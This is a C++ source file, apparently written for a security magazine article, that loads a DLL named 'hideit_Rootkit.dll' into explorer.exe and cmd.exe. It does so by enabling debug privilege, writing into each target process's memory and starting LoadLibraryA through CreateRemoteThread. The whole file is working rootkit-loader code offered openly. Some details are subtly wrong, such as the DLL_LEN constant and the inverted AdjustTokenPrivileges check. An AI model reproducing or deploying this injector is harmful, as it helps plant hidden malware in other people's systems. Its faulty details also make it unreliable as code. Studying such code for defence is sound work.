/*
	##############################################
	### (C) vbCrLf (at GMail), 2011           ####
	###     http://www.MerkazHaKfar.co.cc/    ####
	###                                       ####
	###      Written for DigitalWhisper       ####
	###    http://www.digitalwhisper.co.il/   ####
	##############################################
*/

#include "main.h"
using namespace std;

#define DLL_NAME "\\hideit_Rootkit.dll"
#define DLL_LEN 12

int main(int argc, const char *argv[])
{
	cout << "Getting DLL's path..." << endl;

	char path[MAX_PATH + DLL_LEN];
	if (GetModuleFileName(NULL, path, MAX_PATH) == 0)
	{
		WinAPIError();
		MSGRET("Could not find the path.", false);
	}
	strcpy(strrchr(path, '\\'), DLL_NAME);

	cout << path << endl << endl;

	inject("explorer.exe", path);
	cout << endl;
	inject("cmd.exe", path);

	return 0;
}

bool inject(const char *procName, const char *dllPath)
{
	DWORD pid = procNameToPID(procName);

	cout << "Searching for '" << procName << "'..." << endl;

	if (!pid)
		MSGRET("Process not found.", 1)
	cout << "PID Found: " << pid << ". Injecting..." << endl;
	
	if (dllInjection(pid, dllPath))
	{
		cout << endl << "Succeeded!" << endl;
		cout << "In order to 'kill' the rootkit close and reopen '" << procName << "'." << endl;
		system("pause");
		return true;
	}
	else
		return false;
}

DWORD procNameToPID(const char *procName)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) 
		MSGRET("Unable to create snapshot.", 1)

	PROCESSENTRY32 process;
	process.dwSize = sizeof(PROCESSENTRY32); 
	
	Process32First(snapshot, &process);
	do
	{
		if (strcmp(process.szExeFile, procName) == 0)
			return process.th32ProcessID;
	}
	while (Process32Next(snapshot, &process));
	
	return 0; 
}

bool dllInjection(DWORD pid, string dll)
{
    HMODULE kernel32 = GetModuleHandle("Kernel32");
    FARPROC loadLibrary = GetProcAddress(kernel32, "LoadLibraryA");
    
    HANDLE token;
    TOKEN_PRIVILEGES tokenPriv;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
    {
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tokenPriv.Privileges[0].Luid);
        tokenPriv.PrivilegeCount = 1;
        tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if (AdjustTokenPrivileges(token, 0, &tokenPriv, sizeof(tokenPriv), NULL, NULL) == ERROR_SUCCESS)
		{
			WinAPIError();
			MSGRET("Could not AdjustTokenPrivileges.", false);
		}
    }
	else
		MSGRET("Cannot open process token.", false)

    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
	if (!processHandle)
		MSGRET("Cannot open process.", false)

    LPVOID remoteDllName = VirtualAllocEx(processHandle, NULL, dll.size()+1, MEM_COMMIT, PAGE_READWRITE);

	if (!remoteDllName)
	{
		CloseHandle(processHandle);
		WinAPIError();
		MSGRET("Could not allocate remote memory.", false)
	}

    DWORD dummy;
    WriteProcessMemory(processHandle, remoteDllName, dll.c_str(), dll.size()+1, &dummy);

	HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibrary, remoteDllName, 0, NULL);
	
	if (!remoteThread)
	{
		VirtualFreeEx(processHandle, remoteDllName, dll.size(), MEM_RELEASE);
		CloseHandle(processHandle);
		WinAPIError();
		MSGRET("Could not create remote thread.", false);
	}

	bool finished = WaitForSingleObject(remoteThread, 10000) != WAIT_TIMEOUT;

	VirtualFreeEx(processHandle, remoteDllName, dll.size()+1, MEM_RELEASE);
	CloseHandle(processHandle);

	if (!finished)
		MSGRET("Timeout.", false)
	else
		return true;
}

void WinAPIError()
{
	LPSTR errorMessage = NULL;
	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER, 0, GetLastError(), 0, (LPSTR)&errorMessage, 0, 0);
	cout << "WinAPI: " << errorMessage;
	LocalFree(errorMessage);
}
